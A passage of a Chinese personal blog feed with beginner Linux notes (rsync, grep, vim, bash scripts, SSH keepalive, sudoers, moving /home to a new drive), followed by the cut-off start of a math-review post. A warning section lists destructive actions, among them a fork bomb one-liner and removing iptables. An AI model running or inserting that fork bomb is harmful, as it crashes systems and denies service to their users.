<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">du</span> -sh *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>备份同步rsync, -a（archive）递归并同步时间戳和权限，-v显示详细信息，-z压缩</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rsync</span> -avz <span class="token builtin class-name">source</span> destination<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="查找">查找</h3>
<p>grep查找文件内的内容，支持正则表达式（但是需要加<code>-P</code>参数支持perl正则，否则支持程度有限）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> -n include test.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>显示行号和查找结果1:#include&lt;stdio.h&gt;</p>
<p>find查找文件</p>
<p>（这里建议用fd和ripgrep代替find和grep）</p>
<h2 id="vim基础操作">Vim基础操作</h2>
<p><del>不得不用linux命令界面编辑文件又不喜欢vim直接nano就好了</del></p>
<p>Vim有Normal（普通模式），Insert（插入模式）和 Visual（可视模式）</p>
<p>打开是Normal模式，按i进入插入模式，按v进入Visual模式，按ESC返回Normal模式</p>
<p>输入vi test.c创建文件并进入vim，按i进入insert模式，写完保存退出按ESC，:wq保存退出，:q! 不保存退出</p>
<p>文件写入可能需要sudo，不然会E212错误，退出获取管理员权限再保存即可</p>
<h3 id="简单的脚本">简单的脚本</h3>
<p>脚本文件通常是.sh后缀，在执行的时候<code>bash filename.sh</code> 。在第一行声明执行的shell解释器路径，如#!/bin/bash 。 接收参数用$, $1,$2,$3为第1、2、3个参数，$?为上一个参数的返回值。 使用逻辑判断&amp;&amp;和||, 输出用户是否管理员：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token environment constant">$USER</span> <span class="token operator">=</span> root <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"user"</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"root"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>if 语句, 判断是否存在文件路径，不存在就创建：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable">DIR</span><span class="token operator">=</span><span class="token string">"/media/cdrom"</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -e <span class="token variable">$DIR</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
<span class="token function">mkdir</span> -p <span class="token variable">$DIR</span>
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>while语句:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token keyword">while</span>
<span class="token keyword">do</span>
---
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>差不多能写点脚本玩了（再复杂的东西用python、perl感觉比bash脚本更方便点）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable">PRICE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">expr</span> <span class="token environment constant">$RANDOM</span> %1000<span class="token variable">)</span></span>
<span class="token assign-left variable">TIMES</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token builtin class-name">echo</span> <span class="token string">"Guess a number between 0 and 999"</span>
<span class="token keyword">while</span> <span class="token boolean">true</span>
<span class="token keyword">do</span>
        <span class="token builtin class-name">read</span> -p <span class="token string">"Input your number"</span> INT
        <span class="token builtin class-name">let</span> TIMES++
        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$INT</span> -eq <span class="token variable">$PRICE</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"Congratulations, you are right, the number is <span class="token variable">$PRICE</span>"</span>
                <span class="token builtin class-name">echo</span><span class="token string">"You have guessed <span class="token variable">$TIMES</span>"</span>
                <span class="token builtin class-name">exit</span> <span class="token number">0</span>
        <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">$INT</span> -gt <span class="token variable">$PRICE</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span><span class="token string">"Too High"</span>
        <span class="token keyword">else</span>
                <span class="token builtin class-name">echo</span><span class="token string">"Too low"</span>
        <span class="token keyword">fi</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="不建议轻易尝试的灵车漂移行为">不建议轻易尝试的灵车漂移行为</h2>
<p>下列行为如果你读到这里试了出了麻烦，<em>本人概不负责</em>, 在虚拟机和非生产环境里也可以试着玩 卸载自带python:<code>sudo apt uninstall python</code> 卸载iptables使用<code>sudo apt remove iptables</code> 执行<code>:()&#123; :|:&amp; &#125;;:</code>之类的fork炸弹 不给/home分区</p>
<h2 id="文件系统">文件系统</h2>
<p>“一切皆文件”, 这是UNIX最初的构想，但是Linux里面并不是，比如socket、比如进程，真正实现了一切皆文件是贝尔实验室的Plan9,然而已经凉了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>, <strong>真·入土</strong> 虽然入土了，那个Plan9的风格影响后来很多东西，了也影响了Go，你看LOGO，多像啊 （不得不说贝尔实验室那帮人当年搞出来那一堆东西真的有点意思，形式化验证和Lisp之类的也让人仰望，但是没能商用推广，曲高和寡，<del>其实也不是他们的问题，是大多是人都太菜了，比如我</del>现在一个个都入土了）</p>
<p>文件的信息存在metadata里的inode中，包括UID、修改创建时间、权限等</p>
<p>之前我以为类UNIX系统的文件是个文件树的样子，后来发现加上链接（link）后是一个有向无环图（把符号链接当一个文件的话还是树的样子）</p>
<p>不能对一个目录创建硬链接，貌似是因为会产生回环？（每个目录下的隐藏文件<code>.</code>和<code>..</code>就是本目录和上一级目录的硬链接）</p>
<h2 id="其他">其他</h2>
<h3 id="保持ssh连接不自动退出">保持SSH连接不自动退出</h3>
<p>开启SSH keepalive。 通常的做法是每隔一定时间向服务器发送心跳<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>，应该是防止防火墙把SSH干掉，通常SSH不会自己断的 在<code>/etc/ssh/sshd_config</code>里面设置ClientAliveInterval和ClientAliveInterval 也可以修改<code>.ssh/config</code>文件，设置</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Host Server
    ServerAliveInterval 20
    ServerAliveCountMax 9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="设置用户组和权限">设置用户组和权限</h3>
<p>root用户UID为0，有生杀大权（我们教研室居然每人都有root用户密码，还日常root权限运行命令，可还行（虽然一共也没几个人用）），也有背锅重任，不想背黑锅是不能乱用的 添加用户（root添加其他用户）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> -u <span class="token number">1998</span> zjk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样就在/home/zjk创建了一个名为zjk的用户 切换用户的时候使用su命令就行了(Substitute User) 将用户加到root用户组(需要root权限)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">usermod</span> -G root zjk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新，改了之后发现并不好使，要这样</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> u+w /etc/sudoers
<span class="token function">vi</span> /etc/sudoers
<span class="token comment"># 加一行</span>
zjk <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="硬盘扩容和迁移">硬盘扩容和迁移</h3>
<p>趁打折买了一块西数SN550,之前只有500G还装了个双系统的笔记本可以扩容了</p>
<p>现在把/home分区（大概60G）从老硬盘移动到新硬盘上，空出来的60G给/目录。我既不是LVM也没有组raid，文件系统用的ext4，500G老硬盘分了400G给win10,剩下100G给了linux，分了一个/，40G,一个/home，60G</p>
<p>先格式化（这里我用的GPT分区表，ext4），然后挂载到/mnt,然后用rsync迁移/home下的文件到/mnt 然后umount，然后分区合并给/root，再挂载到/home下面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fdisk</span> -l
yay -Sy <span class="token function">rsync</span>

mkfs.ext4 /dev/nvme0n1p1
<span class="token function">mount</span> /dev/nvme0n1p1 /mnt
<span class="token function">rsync</span> -avz /home /mnt
<span class="token function">umount</span> dev//nvme0n1p1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>两边都是nvme,2分钟就同步完成了，速度非常感人，然后修改fstab，将原来/home分区的uuid改为新硬盘的（/dev/nvme0n1p1）uuid</p>
<p><code>/etc/fstab</code>大概长这个样子，分别是uuid,挂载目录，文件类型，noatime后面0表示不开机自检，/</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">8205</span>-8BC5                            /boot/efi      vfat    <span class="token assign-left variable">umask</span><span class="token operator">=</span>0077 <span class="token number">0</span> <span class="token number">2</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">36499174</span>-6a4a-4b9d-b5cc-0b1f555a1f46 /              ext4    defaults,noatime <span class="token number">0</span> <span class="token number">1</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span>bf5e768c-a2de-4618-9861-5946459a69b6 /home          ext4    defaults,noatime <span class="token number">0</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后退出来，用livecd或者双系统的分区工具把原来的/home分区删掉分给原来的/目录。（注意做好备份不要删错了，删错了就没了）</p>
<p>再次登陆后应该就行了。弄完突然发现KDE自带一个叫KDE Partition Manager的工具，推荐大家用这个。</p>
<h2 id="写在后面的话">写在后面的话</h2>
<p>wsl和虚拟机或者Jetbrains家、vscode的远程也挺香，感觉貌似比linux桌面有前途，好多人都放弃linux桌面了。Linux图形化桌面有出头之日大概至少还需要一个强势的<strong>商业</strong>发行版（此处商业二字特别加粗），钦定桌面DE，钦定桌面布局，限制小白用户的美化和魔改。提供一个中心化的软件商店上架商业软件以及<strong>收费软件</strong>（貌似现在snap和flatpack有点那个意思？），然而这样搞一圈跟Mac和Chrome OS又有什么区别呢。国产化也没什么太大希望，行政命令运动式推广Linux只会让企业里充满特供版UOS这种怪胎（不仅魔改还收费，root权限全给你收了，除了软件商店别想自己装别的了，整的跟个收费版安卓似的），跟自由软件没啥关系了。跟开源社区和个人肯定没多大关系（当然Deepin整了wine还是做了点好事的.......他们自己做的那一套DDE感觉真的是败笔，就像Ubuntu非得自己搞个Ubuntu Touch和Android争一样）</p>
<h2 id="一些花里胡哨的玩意">一些花里胡哨的玩意</h2>
<table>
<thead>
<tr class="header">
<th>Command&amp;Tools</th>
<th>description</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>htop</td>
<td>比top花里胡哨一点</td>
<td></td>
</tr>
<tr class="even">
<td><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pY29sYXJnby9nbGFuY2Vz">glances<i class="fa fa-external-link-alt"></i></span></td>
<td>比htop显示的东西多一点</td>
<td>看起来还比较清爽</td>
</tr>
<tr class="odd">
<td><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FyaXN0b2NyYXRvcy9iYXNodG9w">bashtop/bpytop<i class="fa fa-external-link-alt"></i></span></td>
<td>极其花里胡哨</td>
<td>用起来没比htop好用多少</td>
</tr>
<tr class="even">
<td><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL211ZXNsaS9kdWY=">duf<i class="fa fa-external-link-alt"></i></span></td>
<td>显示磁盘占用</td>
<td></td>
</tr>
</tbody>
</table>
<p>ohmyzsh 广为人知的花里胡哨的东西，比bash花多了</p>
<p>https://github.com/knqyf263/pet 一个terminal里的复制粘贴工具</p>
<h2 id="一些网站和文章">一些网站和文章</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly92aW0tY2hpbmEub3JnLw==">Vim中文社区<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9saW51eHRvb2xzLXJzdC5yZWFkdGhlZG9jcy5pby96aF9DTi9sYXRlc3QvaW5kZXguaHRtbA==">Linux工具快速教程<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9leHBsYWluc2hlbGwuY29tLw==">explainshell<i class="fa fa-external-link-alt"></i></span> 一个shell网站 <span class="exturl" data-url="aHR0cHM6Ly9rZXJuZWxuZXdiaWVzLm9yZy9Eb2N1bWVudHM=">kernelnewbies<i class="fa fa-external-link-alt"></i></span> 好吧这其实不怎么newbie <span class="exturl" data-url="aHR0cHM6Ly9pLmxpbnV4dG95Lm9yZy9kb2NzL2d1aWRlL2NoNDkuaHRtbA==">GNOME与KDE的战争<i class="fa fa-external-link-alt"></i></span> 陈年旧事，社区的分裂</p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cDovL3d3dy5kaS51bmlwaS5pdC9+bmlkcy9kb2NzL3RoZV9wbGFuLTlfZWZmZWN0Lmh0bWw=">Plan9效应<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cDovL2JsdWViaXUuY29tL2Jsb2cvbGludXgtc3NoLXNlc3Npb24tYWxpdmUuaHRtbA==">Linux使用ssh超时断开连接的真正原因<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>数学知识补习</title>
    <url>/0/</url>
    <content><![CDATA[<p>数理基础太差，被关了起来 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/found.png" alt="Picture" style="zoom:40%;"></p>
<a id="more"></a>
<h2 id="矩阵">矩阵</h2>
<h3 id="雅可比矩阵">雅可比矩阵</h3>
<p>将梯度记为沿各坐标轴偏导的一组坐标,可以表示成向量形式</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -6.51ex" xmlns="http://www.w3.org/2000/svg" width="13.049ex" height="14.152ex" role="img" focusable="false" viewBox="0 -3377.5 5767.6 6255"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(261, 676)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(220, -686)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><rect width="1338" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1855.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(2911.6, 0)"><g data-mml-node="mo"><path data-c="23A1" d="M319 -645V1154H666V1070H403V-645H319Z" transform="translate(0, 2223.5)"></path><path data-c="23A3" d="M319 -644V1155H403V-560H666V-644H319Z" transform="translate(0, -2233.5)"></path><svg width="667" height="2857" y="-1178.5" x="0" viewBox="0 714.3 667 2857"><path data-c="23A2" d="M319 0V602H403V0H319Z" transform="scale(1, 7.119)"></path></svg></g><g data-mml-node="mtable" transform="translate(667, 0)"><g data-mml-node="mtr" transform="translate(0, 2387)"><g data-mml-node="mtd" transform="translate(25, 0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 485) scale(0.707)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="msub" transform="translate(566, 0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(490, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mrow" transform="translate(333.7, -345.6) scale(0.707)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><rect width="1232.1" height="60" x="120" y="220"></rect></g></g></g><g data-mml-node="mtr" transform="translate(0, 635.3)"><g data-mml-node="mtd" transform="translate(25, 0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 485) scale(0.707)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="msub" transform="translate(566, 0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(490, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mrow" transform="translate(333.7, -345.6) scale(0.707)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><rect width="1232.1" height="60" x="120" y="220"></rect></g></g></g><g data-mml-node="mtr" transform="translate(0, -875.8)"><g data-mml-node="mtd" transform="translate(177.4, 0)"><g data-mml-node="mo"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g><g data-mml-node="mo" transform="translate(444.7, 0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g><g data-mml-node="mo" transform="translate(889.3, 0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g></g></g><g data-mml-node="mtr" transform="translate(0, -2516.4)"><g data-mml-node="mtd"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 485) scale(0.707)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="msub" transform="translate(566, 0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(490, -150) scale(0.707)"><path 